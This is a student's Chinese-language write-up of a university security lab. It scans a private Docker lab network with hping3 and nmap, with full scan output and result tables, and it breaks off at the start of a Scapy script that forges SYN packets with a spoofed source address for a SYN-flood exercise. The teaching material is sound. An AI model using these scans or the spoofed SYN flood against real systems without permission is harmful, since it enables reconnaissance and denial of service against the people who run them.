+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/infinitepwn/cs-knowledge-tree/raw/main/docs/notes/cybersecurity-lab/lab3/lab3.md" title="查看本页的源代码" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="lab3">lab3<a class="headerlink" href="#lab3" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>来源：<code>网络安全实验 / lab3/lab3.md</code></p>
+</blockquote>
+<h2 id="1">实验1：资产探查与端口扫描<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
+<h3 id="_1">部署网络拓扑<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p><img alt="image-20261013132327215" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132327215.png" /></p>
+<p>vibecoding了一个根据网络拓扑生成对于dockerfile的小工具</p>
+<p>这样就免去反复造轮子之苦</p>
+<h3 id="hping3">hping3<a class="headerlink" href="#hping3" title="Permanent link">&para;</a></h3>
+<p>在攻击者主机上使用hping3工具，分别通过ICMP、TCP、UDP三种方式对192.168.4.60 - 192.168.4.70间的地址进行探测，得出存活的3台主机的名单。</p>
+<h4 id="icmp">ICMP<a class="headerlink" href="#icmp" title="Permanent link">&para;</a></h4>
+<h5 id="hping3icmp-echo-ping192168460">使用hping3的ICMP Echo 请求（通常被称为ping请求）进行探测，这里以192.168.4.60为例。<a class="headerlink" href="#hping3icmp-echo-ping192168460" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>hping3<span class="w"> </span>-1<span class="w"> </span><span class="m">192</span>.168.4.60<span class="w"> </span>
+</code></pre></div>
+<p><img alt="image-20261013132157277" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132157277.png" /></p>
+<p>这个本质就是ping 192.168.4.60，ping不通，因为网络拓扑里我们没部署这个ip</p>
+<p><img alt="image-20261013132259864" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132259864.png" /></p>
+<p>可以看到对于存在的ip，是可以探测出来的</p>
+<h5 id="hping3tcpsynackpushfinrst">使用hping3发送多种类型TCP包进行主机探测，包括SYN、ACK、PUSH、FIN、RST等类型。<a class="headerlink" href="#hping3tcpsynackpushfinrst" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>hping3<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.4.60<span class="w"> </span>
+</code></pre></div>
+<p>还是先试一下不存在的ip，可以看到也是Unreachable</p>
+<p><img alt="image-20261013132532965" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132532965.png" /></p>
+<p>那么如果对于存在的ip，结果如下</p>
+<p><img alt="image-20261013132618573" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132618573.png" /></p>
+<h5 id="hping3udp">使用hping3的udp选项进行探测；<a class="headerlink" href="#hping3udp" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>hping3<span class="w"> </span>--udp<span class="w"> </span>-p<span class="w"> </span><span class="m">123456</span><span class="w"> </span><span class="m">192</span>.168.4.60<span class="w"> </span>
+</code></pre></div>
+<p>实验报告这里的123456有误</p>
+<p><img alt="image-20261013132959301" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013132959301.png" /></p>
+<p><strong>UDP 端口号的合法范围是 0～65535</strong>，怎么可能到123456？</p>
+<p><img src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013133426355.png" alt="image-20261013133426355" style="zoom:50%;" /></p>
+<p>我们随便选了一个端口12345，诶，发现ICMP Port Unreachable，因为UDP它是无连接，不像TCP那样握手建立连接，所以对于未开放的端口，我们是无法用udp探测的，但是关键是我们也不知道哪些端口是开放的</p>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<p>相比于hping3只能探测单个目标，Nmap可以使用多种探测方式快速扫描整个网段，并且具备识别操作系统、服务和版本探测、以及脚本扫描等功能。虽然Nmap能通过参数指定扫描方式，但是通过抓包能观察到它会结合其它方式进行探测。在攻击者主机上使用Nmap对192.168.4.0/24网段进行扫描，获取存活主机名单、设备类型（如路由器信息）、操作系统等信息，完成表2。   </p>
+<h5 id="nmap1921684024">使用Nmap主机探测功能获取192.168.4.0/24存活的主机名单。<a class="headerlink" href="#nmap1921684024" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.4.0/24<span class="w"> </span>
+</code></pre></div>
+<p><img alt="image-20261013133742022" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013133742022.png" /></p>
+<p>可以看到一下子就扫描出来了，这里192.168.4.1是docker bridge的ip，192.168.4.10是路由器的接口ip</p>
+<p>(2) 使用 Nmap获取主机的详细信息，如操作系统、主机类型、服务和版本等。 </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap<span class="w"> </span>-sS<span class="w"> </span><span class="m">192</span>.168.4.0/24<span class="w"> </span>-O<span class="w"> </span>-A<span class="w"> </span>-sV<span class="w"> </span>
+</code></pre></div>
+<p><img alt="image-20261013134036812" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013134036812.png" /></p>
+<p>可以看到结果很多啊，那这边就复制一下文本</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>root@attacker:~$<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span><span class="m">192</span>.168.4.0/24<span class="w"> </span>-O<span class="w"> </span>-A<span class="w"> </span>-sV<span class="w"> </span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-10-13<span class="w"> </span><span class="m">05</span>:39<span class="w"> </span>UTC
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00018s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.4.1<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>Too<span class="w"> </span>many<span class="w"> </span>fingerprints<span class="w"> </span>match<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>give<span class="w"> </span>specific<span class="w"> </span>OS<span class="w"> </span>details
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="m">1</span><span class="w">   </span><span class="m">0</span>.04<span class="w"> </span>ms<span class="w"> </span>router.topology-lab_net_link_link-1<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.2.10<span class="o">)</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="m">2</span><span class="w">   </span><span class="m">0</span>.20<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.10
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.000038s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.4.10<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>Too<span class="w"> </span>many<span class="w"> </span>fingerprints<span class="w"> </span>match<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>give<span class="w"> </span>specific<span class="w"> </span>OS<span class="w"> </span>details
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">1</span><span class="w"> </span>hop
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="m">1</span><span class="w">   </span><span class="m">0</span>.03<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.10
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.61
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.000064s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.4.61<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>Too<span class="w"> </span>many<span class="w"> </span>fingerprints<span class="w"> </span>match<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>give<span class="w"> </span>specific<span class="w"> </span>OS<span class="w"> </span>details
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>-<span class="w">   </span>Hop<span class="w"> </span><span class="m">1</span><span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>as<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="m">2</span><span class="w">   </span><span class="m">0</span>.06<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.61
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.67
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.000056s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.4.67<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>Too<span class="w"> </span>many<span class="w"> </span>fingerprints<span class="w"> </span>match<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>give<span class="w"> </span>specific<span class="w"> </span>OS<span class="w"> </span>details
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>-<span class="w">   </span>Hop<span class="w"> </span><span class="m">1</span><span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>as<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a><span class="m">2</span><span class="w">   </span><span class="m">0</span>.05<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.67
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.68
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.000071s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a>All<span class="w"> </span><span class="m">1000</span><span class="w"> </span>scanned<span class="w"> </span>ports<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.4.68<span class="w"> </span>are<span class="w"> </span><span class="k">in</span><span class="w"> </span>ignored<span class="w"> </span>states.
+<a id="__codelineno-5-53" name="__codelineno-5-53" href="#__codelineno-5-53"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">1000</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-54" name="__codelineno-5-54" href="#__codelineno-5-54"></a>Too<span class="w"> </span>many<span class="w"> </span>fingerprints<span class="w"> </span>match<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>give<span class="w"> </span>specific<span class="w"> </span>OS<span class="w"> </span>details
+<a id="__codelineno-5-55" name="__codelineno-5-55" href="#__codelineno-5-55"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+<a id="__codelineno-5-56" name="__codelineno-5-56" href="#__codelineno-5-56"></a>
+<a id="__codelineno-5-57" name="__codelineno-5-57" href="#__codelineno-5-57"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-58" name="__codelineno-5-58" href="#__codelineno-5-58"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-59" name="__codelineno-5-59" href="#__codelineno-5-59"></a>-<span class="w">   </span>Hop<span class="w"> </span><span class="m">1</span><span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>as<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-60" name="__codelineno-5-60" href="#__codelineno-5-60"></a><span class="m">2</span><span class="w">   </span><span class="m">0</span>.05<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.68
+<a id="__codelineno-5-61" name="__codelineno-5-61" href="#__codelineno-5-61"></a>
+<a id="__codelineno-5-62" name="__codelineno-5-62" href="#__codelineno-5-62"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.105
+<a id="__codelineno-5-63" name="__codelineno-5-63" href="#__codelineno-5-63"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00019s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-5-64" name="__codelineno-5-64" href="#__codelineno-5-64"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">999</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-5-65" name="__codelineno-5-65" href="#__codelineno-5-65"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-5-66" name="__codelineno-5-66" href="#__codelineno-5-66"></a><span class="m">8000</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>SimpleHTTPServer<span class="w"> </span><span class="m">0</span>.6<span class="w"> </span><span class="o">(</span>Python<span class="w"> </span><span class="m">3</span>.12.3<span class="o">)</span>
+<a id="__codelineno-5-67" name="__codelineno-5-67" href="#__codelineno-5-67"></a><span class="p">|</span>_http-title:<span class="w"> </span>Directory<span class="w"> </span>listing<span class="w"> </span><span class="k">for</span><span class="w"> </span>/
+<a id="__codelineno-5-68" name="__codelineno-5-68" href="#__codelineno-5-68"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>SimpleHTTP/0.6<span class="w"> </span>Python/3.12.3
+<a id="__codelineno-5-69" name="__codelineno-5-69" href="#__codelineno-5-69"></a>Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose
+<a id="__codelineno-5-70" name="__codelineno-5-70" href="#__codelineno-5-70"></a>Running:<span class="w"> </span>Linux<span class="w"> </span><span class="m">4</span>.X<span class="p">|</span><span class="m">5</span>.X
+<a id="__codelineno-5-71" name="__codelineno-5-71" href="#__codelineno-5-71"></a>OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel:4<span class="w"> </span>cpe:/o:linux:linux_kernel:5
+<a id="__codelineno-5-72" name="__codelineno-5-72" href="#__codelineno-5-72"></a>OS<span class="w"> </span>details:<span class="w"> </span>Linux<span class="w"> </span><span class="m">4</span>.15<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.8
+<a id="__codelineno-5-73" name="__codelineno-5-73" href="#__codelineno-5-73"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+<a id="__codelineno-5-74" name="__codelineno-5-74" href="#__codelineno-5-74"></a>
+<a id="__codelineno-5-75" name="__codelineno-5-75" href="#__codelineno-5-75"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
+<a id="__codelineno-5-76" name="__codelineno-5-76" href="#__codelineno-5-76"></a>HOP<span class="w"> </span>RTT<span class="w">     </span>ADDRESS
+<a id="__codelineno-5-77" name="__codelineno-5-77" href="#__codelineno-5-77"></a>-<span class="w">   </span>Hop<span class="w"> </span><span class="m">1</span><span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>as<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.4.1
+<a id="__codelineno-5-78" name="__codelineno-5-78" href="#__codelineno-5-78"></a><span class="m">2</span><span class="w">   </span><span class="m">0</span>.05<span class="w"> </span>ms<span class="w"> </span><span class="m">192</span>.168.4.105
+<a id="__codelineno-5-79" name="__codelineno-5-79" href="#__codelineno-5-79"></a>
+<a id="__codelineno-5-80" name="__codelineno-5-80" href="#__codelineno-5-80"></a>OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<a id="__codelineno-5-81" name="__codelineno-5-81" href="#__codelineno-5-81"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">256</span><span class="w"> </span>IP<span class="w"> </span>addresses<span class="w"> </span><span class="o">(</span><span class="m">6</span><span class="w"> </span>hosts<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">17</span>.64<span class="w"> </span>seconds
+</code></pre></div>
+<p>对于没有开放tcp端口的机器，好像无法扫描到操作系统</p>
+<p>主要原因是因为前面涉及网络拓扑的时候,我们把资产弄成client了，没开放服务</p>
+<p><img alt="image-20261013143307889" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013143307889.png" /></p>
+<p>稍微修改一下</p>
+<p>现在就可以扫描出来了</p>
+<p><img alt="image-20261013143909801" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013143909801.png" /></p>
+<p>表3</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">存活主机ip</th>
+<th>设备类型</th>
+<th>操作系统</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">192.168.4.61</td>
+<td>general purpose</td>
+<td>Linux 4.15–5.8</td>
+</tr>
+<tr>
+<td style="text-align: center;">192.168.4.67</td>
+<td>general purpose</td>
+<td>Linux 4.15–5.8</td>
+</tr>
+<tr>
+<td style="text-align: center;">192.168.4.68</td>
+<td>general purpose</td>
+<td>Linux 4.15–5.8</td>
+</tr>
+</tbody>
+</table>
+<h5 id="nmap1921684105">使用 Nmap对服务器（192.168.4.105）开展全端口扫描，获取端口开放状态，并判断端口对应的服务及版本<a class="headerlink" href="#nmap1921684105" title="Permanent link">&para;</a></h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="w"> </span>nmap<span class="w"> </span><span class="m">192</span>.168.4.105<span class="w"> </span>-p-<span class="w"> </span>-O<span class="w"> </span>-A<span class="w"> </span>-sV<span class="w"> </span>
+</code></pre></div>
+<p><img alt="image-20261013141321773" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013141321773.png" /></p>
+<p>表4</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">端口</th>
+<th>8000</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">开放状态</td>
+<td>open</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align: center;">服务及版本</td>
+<td>http  SimpleHTTPServer 0.6 (Python 3.12.3)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="2syn">实验2：SYN洪泛攻击与防范<a class="headerlink" href="#2syn" title="Permanent link">&para;</a></h2>
+<h3 id="_2">网络拓扑<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><img alt="image-20261013144834141" src="https://raw.githubusercontent.com/infinitepwn/note_picbed/main/image-20261013144834141.png" /></p>
+<p>加一个user,需要gui</p>
+<h5 id="scapyscapytcp-syn">攻击者主机上提供Scapy环境，实验者需编辑Scapy脚本构造TCP SYN数据包<a class="headerlink" href="#scapyscapytcp-syn" title="Permanent link">&para;</a></h5>
+<p>写成python脚本</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">scapy.all</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span> 
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">source_ip</span> <span class="o">=</span> <span class="s1">'192.168.3.100'</span> <span class="c1">#伪造的源地址 </span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">target_ip</span> <span class="o">=</span> <span class="s1">'192.168.4.105'</span> 
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">target_port</span> <span class="o">=</span> <span class="mi">8000</span> 
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">ip_packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">source_ip</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span>
